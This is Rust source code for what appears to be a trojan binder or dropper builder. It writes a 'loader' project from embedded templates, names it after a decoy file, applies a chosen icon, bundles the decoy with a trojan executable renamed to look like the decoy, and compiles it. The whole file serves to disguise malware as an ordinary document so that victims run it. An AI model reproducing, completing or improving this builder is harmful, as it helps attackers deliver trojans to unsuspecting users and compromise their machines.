use rust_embed::RustEmbed;
use std::fs::{write,create_dir_all};
use rsmaker::read_file;
use rsmaker::complie;

#[derive(RustEmbed)]
#[folder = "temp"]
struct Asset;

pub fn make_rs(filename:String,trojan:String,icon:String)->(){
    
    let main = Asset::get("embed/main.rs").unwrap();
    let main_str = std::str::from_utf8(main.data.as_ref()).unwrap();

    let build = Asset::get("embed/build.rs").unwrap();
    let build_str = std::str::from_utf8(build.data.as_ref()).unwrap();

    let toml = Asset::get("embed/Cargo.toml").unwrap();
    let toml_str = std::str::from_utf8(toml.data.as_ref()).unwrap();

    let icon_rc = Asset::get("embed/icon.rc").unwrap();
    let   icon_rc_str = std::str::from_utf8(icon_rc.data.as_ref()).unwrap();



    let fake:Vec<&str> = filename.split(".").collect();

    println!("wirtting files....");
    let _ = create_dir_all("loader/src");
    let _ = create_dir_all("loader/tep");
    //let main_str = &main_str.replace("XXXX",&format!("*.{}.exe",&fake[1]));
    //println!("please do not forget change the prefix of the file name as {}.exe",&fake[1]);
    let _ = write(format!("loader/src/main.rs"), main_str);
    let toml_str = &toml_str.replace("embed-rs", &fake[0]);
    let _ = write(format!("loader/Cargo.toml"), toml_str);
    let _ = write(format!("loader/build.rs"), build_str);
    let icon_rc_str = &icon_rc_str.replace("test", &icon);
    let _ = write(format!("loader/icon.rc"), icon_rc_str);
    copy_file(filename,trojan,icon);


}


pub fn run(file:String,trojan:String,icon:String)->std::io::Result<()>{

    make_rs(file,trojan,icon);

    complie();
    Ok(())
}

pub fn copy_file(filename:String,trojan_name:String,icon_name:String){
    println!("copying file....");
    let fakename:Vec<&str> = filename.split(".").collect();

    let file = read_file(filename.clone());
    let _ = write(format!("loader/tep/{}",filename), file);

    let trojan = read_file(trojan_name.clone());
    let _ = write(format!("loader/tep/{}.exe",fakename[0]), trojan);

    let icon = read_file(icon_name.clone());
    let _ = write(format!("loader/{}",icon_name), icon);

}